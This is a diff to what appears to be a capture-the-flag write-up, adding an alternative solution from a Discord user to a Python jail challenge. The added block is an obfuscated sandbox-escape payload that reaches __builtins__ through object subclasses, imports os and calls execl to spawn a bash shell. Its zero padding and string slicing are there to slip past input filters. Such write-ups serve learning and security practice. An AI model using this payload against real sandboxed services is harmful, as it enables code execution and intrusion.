@@ -161,3 +161,9 @@ print(f"{flag = }")
 p.interactive()
 p.close()
 ```
+
+Also by @mji from Discord, using chain `''.__class__.__subclasses__()[0].__dir__.__globals__["__builtins__"]["__import__"]("os").execl("/bin/bash","sh")`:
+
+```python
+[[[''.__class__][0000000000000000000000000000].__subclasses__()[[]<[]].__dir__][0000000000000000000000].__globals__['__builtins__0000000000000000000000'[:0b000000000001100]]['__import__xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'[:0b000000000000000000001010]]('os___________'[:0b00000000000000000000000000000000000010+00000000000000000000+0000000000]).execl][0000000000000000]("/\u002fbin/bash","sh")
+```
